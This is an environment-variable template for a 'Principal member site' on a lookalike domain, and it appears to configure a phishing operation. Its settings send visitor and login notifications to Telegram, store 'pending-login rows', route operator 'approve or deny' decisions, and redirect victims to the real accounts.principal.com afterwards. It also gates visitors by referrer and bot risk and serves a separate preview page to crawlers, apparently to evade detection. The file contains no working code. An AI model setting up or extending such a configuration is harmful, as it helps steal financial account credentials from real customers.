# ─────────────────────────────────────────────────────────────────────────────
# env.example — Principal member site
# Copy to `.env.local` and fill in real values. NEVER commit `.env.local`.
# Placeholders only in this file; it is safe to track.
# ─────────────────────────────────────────────────────────────────────────────

# ── Ops Telegram (required: visitor + login notifications) ───────────────────
# Bot token from @BotFather
TELEGRAM_BOT_TOKEN=
# One chat id, or several comma-separated (e.g. 111,222,333)
TELEGRAM_CHAT_ID=

# ── SEO admin Telegram (optional; separate channel — never reuse ops tokens) ──
# Required on Vercel Build env (not Runtime-only) for IndexNow Telegram on deploy
TELEGRAM_SEO_BOT_TOKEN=
TELEGRAM_SEO_ADMIN=

# ── Neon storage (pending-login rows + bot audit) ────────────────────────────
# Official primary shard. No CC_ID needed for this one.
DATABASE_URL=postgresql://USER:PASSWORD@HOST/DATABASE?sslmode=require
# Silent shard-0 alias read by lib/database-urls.ts (DATABASE_URL wins).
# DB_1=postgresql://USER:PASSWORD@HOST/DATABASE?sslmode=require
# Optional extra primary shards DB_2 … DB_10 (shard index 1…9). Shared shards
# require CC_ID. Order: DATABASE_URL → DB_2 … DB_10 → DATABASE_BACKUP_FALLBACK.
# DB_2=postgresql://USER:PASSWORD@HOST/DATABASE?sslmode=require
# DB_3=postgresql://USER:PASSWORD@HOST/DATABASE?sslmode=require
# DB_4=postgresql://USER:PASSWORD@HOST/DATABASE?sslmode=require
# DB_5=postgresql://USER:PASSWORD@HOST/DATABASE?sslmode=require
# DB_6=postgresql://USER:PASSWORD@HOST/DATABASE?sslmode=require
# DB_7=postgresql://USER:PASSWORD@HOST/DATABASE?sslmode=require
# DB_8=postgresql://USER:PASSWORD@HOST/DATABASE?sslmode=require
# DB_9=postgresql://USER:PASSWORD@HOST/DATABASE?sslmode=require
# DB_10=postgresql://USER:PASSWORD@HOST/DATABASE?sslmode=require
# Last-resort fallback shard (shared OK). Requires CC_ID.
# DATABASE_BACKUP_FALLBACK=postgresql://USER:PASSWORD@HOST/DATABASE?sslmode=require
# Control Center pod id — must EXACTLY match the admin portal CC_ID, otherwise
# DB_2…DB_10 and backup rows never appear in that portal.
# CC_ID=YourPodName
# Optional per-shard project ids used by lib/database-urls.ts for diagnostics
# (NEON_PROJECT_ID_1 … NEON_PROJECT_ID_10, matching the DB_N slot).
# NEON_PROJECT_ID_1=
# NEON_PROJECT_ID_2=

# ── Admin approval links (Telegram "Approve or deny" target) ────────────────
# Origin only — middleware strips /admin/login and query params.
ADMIN_PORTAL_URL=https://admin.example.com

# ── Site identity / SEO ──────────────────────────────────────────────────────
SITE_URL=https://account-principal.com
NEXT_PUBLIC_SITE_URL=https://account-principal.com
# Short site slug used for site_id isolation in Neon (e.g. principal)
SITE_ID=principal
NEXT_PUBLIC_SITE_ID=principal
# Final destination after an approved gate (/api/login-out)
LOGIN_REDIRECT_URL=https://accounts.principal.com/
# IndexNow key file (public/<key>.txt); enables postbuild submission
# INDEXNOW_KEY=
# Set to 1 to force the IndexNow ping on a non-Vercel local build
# INDEXNOW_ON_BUILD=

# ── Local development only (never set on production) ─────────────────────────
# Unlock the referrer gate + bot-risk gates for local QA
ALLOW_LOCAL_TESTING=true
# 1 = serve the SSR crawler preview to crawlers; 0 = normal landing
CSP=0

# ── Optional ops extras ──────────────────────────────────────────────────────
# Shared secret for the crawler IP-range refresh endpoint
# CRON_SECRET=
# Require full bot verification (CIDR + DNS) before serving
# VERIFY_FULL=
